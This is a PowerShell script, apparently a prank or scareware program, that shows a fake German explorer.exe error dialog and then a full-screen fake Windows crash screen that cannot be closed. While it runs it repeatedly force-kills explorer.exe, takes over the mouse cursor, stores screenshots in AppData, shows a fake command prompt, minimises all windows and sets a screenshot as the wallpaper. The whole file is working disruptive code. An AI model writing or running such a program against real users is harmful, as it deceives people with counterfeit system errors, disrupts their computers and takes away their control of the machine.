
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Application]::EnableVisualStyles()
$global:mmove = 0
$screenshot = 0
$counttext = "0"
$location = 0
$adzero = 0
$count = 0

$FormA                           = New-Object system.Windows.Forms.Form
$FormA.ClientSize                = New-Object System.Drawing.Point(473,196)
$FormA.text                      = "DDE Server Window: explorer.exe - Fehler in Anwendung"
$FormA.TopMost                   = $true
$FormA.ShowInTaskbar = $false 
$FormA.Location.X = 0
$FormA.Location.Y = 0
$FormA.StartPosition = "manual"
$FormA.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::Fixed3D
$FormA.MaximizeBox = $false
$FormA.MinimizeBox = $false
$FormA.Icon 

$LabelA                          = New-Object system.Windows.Forms.Label
$LabelA.text                     = "Die Anweisung in Ox00007FF726AB90E2 verwies auf" + "`n" + "Arbeitsspeicher bei 0x0000000000000030." + "`n" + "Der Vorgang written konnte im" + "`n" + "Arbeitsspeicher nicht durchgeführt werden." + "`n" + "" + "`n" + "" + "`n" + "Klicken Sie auf `"OK`", um das Programm zu beenden."
$LabelA.AutoSize                 = $true
$LabelA.width                    = 25
$LabelA.height                   = 10
$LabelA.location                 = New-Object System.Drawing.Point(104,13)
$LabelA.Font                     = New-Object System.Drawing.Font('Microsoft Sans Serif',10)

$PanelA                          = New-Object system.Windows.Forms.Panel
$PanelA.height                   = 79
$PanelA.width                    = 490
$PanelA.location                 = New-Object System.Drawing.Point(-6,137)
$PanelA.BackColor                = [System.Drawing.ColorTranslator]::FromHtml("#e3e3e3")

$ButtonA                         = New-Object system.Windows.Forms.Button
$ButtonA.text                    = "OK"
$ButtonA.width                   = 91
$ButtonA.height                  = 30
$ButtonA.location                = New-Object System.Drawing.Point(365,11)
$ButtonA.Font                    = New-Object System.Drawing.Font('Microsoft Sans Serif',10)

$FormA.controls.AddRange(@($LabelA,$PanelA))
$PanelA.controls.AddRange(@($ButtonA))

$Fehler                          = New-Object system.Windows.Forms.Form
$Fehler.ClientSize               = New-Object System.Drawing.Point(8000,8000)
$Fehler.text                     = "Fehler"
$Fehler.TopMost                  = $true
$Fehler.BackColor                = [System.Drawing.ColorTranslator]::FromHtml("#0078d7")
$Fehler.ShowInTaskbar = $false 
$Fehler.Location.X = 0
$Fehler.Location.Y = 0
$Fehler.StartPosition = "manual"
$Fehler.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
$Fehler.Add_MouseMove({ $global:mmove += 1 })
$Fehler.add_FormClosing({$_.Cancel=$true})


$Label1                          = New-Object system.Windows.Forms.Label
$Label1.text                     = ":("
$Label1.AutoSize                 = $true
$Label1.width                    = 25
$Label1.height                   = 10
$Label1.location                 = New-Object System.Drawing.Point(31,44)
$Label1.Font                     = New-Object System.Drawing.Font('Microsoft New Tai Lue',90)
$Label1.ForeColor                = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
$Label1.FlatStyle  

$Label2                          = New-Object system.Windows.Forms.Label
$Label2.text                     = "Your PC ran into a problem and needs to restart as soon as we`'re"
$Label2.AutoSize                 = $true
$Label2.width                    = 25
$Label2.height                   = 10
$Label2.location                 = New-Object System.Drawing.Point(60,253)
$Label2.Font                     = New-Object System.Drawing.Font('Microsoft JhengHei Lite',20)
$Label2.ForeColor                = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")

$Label21                          = New-Object system.Windows.Forms.Label
$Label21.text                     = "finished collecting some error info."
$Label21.AutoSize                 = $true
$Label21.width                    = 25
$Label21.height                   = 10
$Label21.location                 = New-Object System.Drawing.Point(60,303)
$Label21.Font                     = New-Object System.Drawing.Font('Microsoft JhengHei Lite',20)
$Label21.ForeColor                = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")


$Label3                          = New-Object system.Windows.Forms.Label
$Label3.text                     = "$count% complete"
$Label3.AutoSize                 = $true
$Label3.width                    = 25
$Label3.height                   = 10
$Label3.location                 = New-Object System.Drawing.Point(60,384)
$Label3.Font                     = New-Object System.Drawing.Font('Microsoft JhengHei Lite',20)
$Label3.ForeColor                = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")

$Label4                          = New-Object system.Windows.Forms.Label
$Label4.text                     = "For more information about this issue and possible fixes, visit https://www.windows.com/stopcode"
$Label4.AutoSize                 = $true
$Label4.width                    = 25
$Label4.height                   = 10
$Label4.location                 = New-Object System.Drawing.Point(186,462)
$Label4.Font                     = New-Object System.Drawing.Font('Microsoft JhengHei Lite',10)
$Label4.ForeColor                = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")

$PictureBox1                     = New-Object system.Windows.Forms.PictureBox
$PictureBox1.width               = 95
$PictureBox1.height              = 95
$PictureBox1.location            = New-Object System.Drawing.Point(70,462)
$PictureBox1.imageLocation       = ".\010.png"
$PictureBox1.SizeMode            = [System.Windows.Forms.PictureBoxSizeMode]::zoom

$PictureBox2                     = New-Object system.Windows.Forms.PictureBox
$PictureBox2.width               = 8000
$PictureBox2.height              = 10000
$PictureBox2.location            = New-Object System.Drawing.Point(100,100)
$PictureBox2.imageLocation       = ($env:userprofile + "\appData\roaming\löschmich_1.png")
$PictureBox2.SizeMode            = [System.Windows.Forms.PictureBoxSizeMode]::Normal

$Label5                          = New-Object system.Windows.Forms.Label
$Label5.text                     = "If you call a support person, give them this info"
$Label5.AutoSize                 = $true
$Label5.width                    = 25
$Label5.height                   = 10
$Label5.location                 = New-Object System.Drawing.Point(186,516)
$Label5.Font                     = New-Object System.Drawing.Font('Microsoft JhengHei Lite',8)
$Label5.ForeColor                = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")

$Label6                          = New-Object system.Windows.Forms.Label
$Label6.text                     = "Stop code CRITICAL_PROCESS DIED "
$Label6.AutoSize                 = $true
$Label6.width                    = 25
$Label6.height                   = 10
$Label6.location                 = New-Object System.Drawing.Point(186,544)
$Label6.Font                     = New-Object System.Drawing.Font('Microsoft JhengHei Lite',8)
$Label6.ForeColor                = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")

$Fehler.controls.AddRange(@($PictureBox1,$Label2,$Label21,$Label1,$Label3,$Label4,$Label5,$Label6,$PictureBox2))

#Write your logic code here
$count = 0

[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
function screenshot([Drawing.Rectangle]$bounds, $path) {
$global:bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
$global:graphics = [Drawing.Graphics]::FromImage($global:bmp)

$global:graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

$global:bmp.Save($path)

$global:graphics.Dispose()
$global:bmp.Dispose()
}
function Set-WallPaper($Image) {
Add-Type -TypeDefinition @" 
using System; 
using System.Runtime.InteropServices;
  
public class Params
{ 
    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
    public static extern int SystemParametersInfo (Int32 uAction, 
                                                   Int32 uParam, 
                                                   String lpvParam, 
                                                   Int32 fuWinIni);
}
"@ 
  
    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02
  
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
  
    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
 
}
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $Screen.Width, $Screen.Height)
$PictureBox2.Visible = $false
[void]$Fehler.Show()

screenshot -bounds $bounds  -path ($env:userprofile + "\appData\roaming\löschmich_1.png")

do{[System.Windows.Forms.Application]::DoEvents()
[void]$Fehler.Update()
Start-Sleep -Milliseconds 1
if($count -eq 0){

start-sleep -Seconds 1
$PictureBox2.Visible = $true
}

if($count -lt 30000000){
Stop-Process -Name explorer -Force
$count += Get-Random -Maximum 100000
$Label3.text                     = "$count% complete"
}
else{
    $Label3.text                     = "$counttext% complete"
    if($adzero -lt 4){
    $counttext = $counttext + $counttext
    }
    $adzero += 1
}


if($global:mmove -gt 2 -and $global:mmove -lt 50){
$Pos = [System.Windows.Forms.Cursor]::Position
$x = ($pos.X % (Get-Random -Minimum 1 -Maximum 1000)) + 100
$y = ($pos.Y % (Get-Random -Minimum 1 -Maximum 1000)) + 100
[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
}
else{
$global:mmove = 0
$Pos = [System.Windows.Forms.Cursor]::Position
$x = 5000
$y = 5000
[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
}
if($screenshot -lt 120){
if($screenshot -gt 1){
screenshot -bounds $bounds  -path ($env:userprofile + "\appData\roaming\löschmich_2.png")
$PictureBox2.imageLocation       = ($env:userprofile + "\appData\roaming\löschmich_2.png")
}
}
if($screenshot -gt 500 -and $screenshot -lt 550){
$PictureBox2.imageLocation       = ""
}
if($screenshot -gt 600 -and $screenshot -lt 800){
$PictureBox2.imageLocation       = ($env:userprofile + "\appData\roaming\löschmich_1.png")
}
if($screenshot -eq 650){
$PictureBox2.imageLocation       = ($env:userprofile + "\appData\roaming\löschmich_1.png")
$PictureBox2.location            = New-Object System.Drawing.Point(0,0)
$Label1.Visible = $false 
$Label2.Visible = $false
$Label21.Visible = $false
$Label3.Visible = $false
$Label4.Visible = $false
$PictureBox1.Visible = $false
$Label5.Visible = $false
$Label6.Visible = $false
}
if($screenshot -gt 650 -and $PictureBox2.location.Y -lt ($Screen.Height -100)){
$location += Get-Random -Maximum 10 -Minimum (-5)
$PictureBox2.location            = New-Object System.Drawing.Point(0,$location)
}
if($screenshot -gt 900 -and $screenshot -lt 1200){
$Fehler.BackColor                = [System.Drawing.ColorTranslator]::FromHtml("black")
$Label1.Visible = $true 
$Label2.Visible = $true
$Label21.Visible = $true
$Label3.Visible = $true
$Label4.Visible = $true
$PictureBox1.Visible = $true
$Label5.Visible = $true
$Label6.Visible = $true

$Label2.text                     = "er'`ew sa noos sa tratser ot sdeen dna melborp a otni nar CP ruoY"
$Label21.text                     = "finished collecting some error info.$point"
$point += "."
$pointcounter += 1
if($pointcounter -eq 100){
$Fehler.BackColor                = [System.Drawing.ColorTranslator]::FromHtml("red")
$point += "`n"
$pointcounter = 0
}
$Label1.Font                     = New-Object System.Drawing.Font('Microsoft New Tai Lue',20)

}
if($screenshot -eq 1205){  
$Label1.Visible = $false 
$Label21.Visible = $false
$Label3.Visible = $false
$Label4.Visible = $false
$PictureBox1.Visible = $false
$PictureBox2.Visible = $false
$Label5.Visible = $false
$Label6.Visible = $false
$Fehler.BackColor                = [System.Drawing.ColorTranslator]::FromHtml("black")
$Label2.Font                     = New-Object System.Drawing.Font('Lucida Console',13)
$Label2.location                 = New-Object System.Drawing.Point(10,10)
$Label2.text                     = ($env:userprofile+">")
}
if($screenshot -eq 1216){
$Label2.text                     = ($env:userprofile+">")
}
if($screenshot -eq 1226){
$Label2.text                     = ($env:userprofile+">_")
}
if($screenshot -eq 1236){
$Label2.text                     = ($env:userprofile+">")
}
if($screenshot -eq 1246){
$Label2.text                     = ($env:userprofile+">_")
}
if($screenshot -eq 1256){
$Label2.text                     = ($env:userprofile+">")
}
if($screenshot -eq 1266){
$Label2.text                     = ($env:userprofile+">_")
}
if($screenshot -eq 1276){
$Label2.text                     = ($env:userprofile+">")
}
if($screenshot -eq 1286){
$Label2.text                     = ($env:userprofile+">_")
}
if($screenshot -eq 1296){
$Label2.text                     = ($env:userprofile+">")
}
if($screenshot -eq 1306){
$Label2.text                     = ($env:userprofile+">_")
$shell = New-Object -ComObject "Shell.Application"
$shell.minimizeall()
$exit = 1
}

$screenshot += 1
}until($Fehler.Visible -eq $false -or $exit -eq 1)
Set-WallPaper -Image ($env:userprofile + "\appData\roaming\löschmich_1.png")
